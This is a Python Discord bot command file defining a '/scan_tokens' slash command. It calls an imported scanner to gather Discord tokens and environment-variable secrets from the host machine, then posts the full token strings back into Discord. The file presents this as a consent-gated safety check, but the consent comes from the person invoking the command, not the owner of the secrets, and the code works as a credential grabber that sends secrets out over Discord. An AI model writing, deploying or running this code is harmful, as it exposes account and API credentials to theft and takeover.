import discord
from discord.ext import commands
from discord import app_commands
from core.consent_manager import ConsentManager
from core.token_scanner import TokenScanner

class TokenScanCommand(commands.Cog):
    """Token scanning command"""
    
    def __init__(self, bot):
        self.bot = bot
        self.consent_mgr = ConsentManager()
        self.scanner = TokenScanner()
    
    @app_commands.command(name="scan_tokens", description="Scan for exposed Discord/API tokens")
    async def scan_tokens(self, interaction: discord.Interaction):
        """Scan for exposed tokens"""
        user_id = interaction.user.id
        
        if not self.consent_mgr.has_consent(user_id, 'tokens') and not self.consent_mgr.has_consent(user_id, 'all'):
            await interaction.response.send_message("❌ You need to grant consent first! Use `/consent_tokens`", ephemeral=True)
            return
        
        await interaction.response.defer(ephemeral=True)
        
        try:
            tokens = self.scanner.scan_discord_tokens()
            env_tokens = self.scanner.scan_environment_tokens()
            
            report = f"""
🔑 **TOKEN SCAN RESULTS**

Discord Tokens Found: {len(tokens)}
Environment Tokens Found: {len(env_tokens)}

**Discord Tokens:**
```
{chr(10).join(tokens[:5]) if tokens else 'None found'}
```

**Environment Tokens:**
```
{chr(10).join(env_tokens) if env_tokens else 'None found'}
```

⚠️ Keep these tokens safe! Never share them!
            """
            
            if len(report) > 2000:
                await interaction.followup.send(report[:2000], ephemeral=True)
                await interaction.followup.send(report[2000:], ephemeral=True)
            else:
                await interaction.followup.send(report, ephemeral=True)
            
            self.consent_mgr.log_consent(user_id, 'tokens', True, f"Scan complete - {len(tokens)} tokens found")
        except Exception as e:
            await interaction.followup.send(f"❌ Error during scan: {str(e)}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(TokenScanCommand(bot))
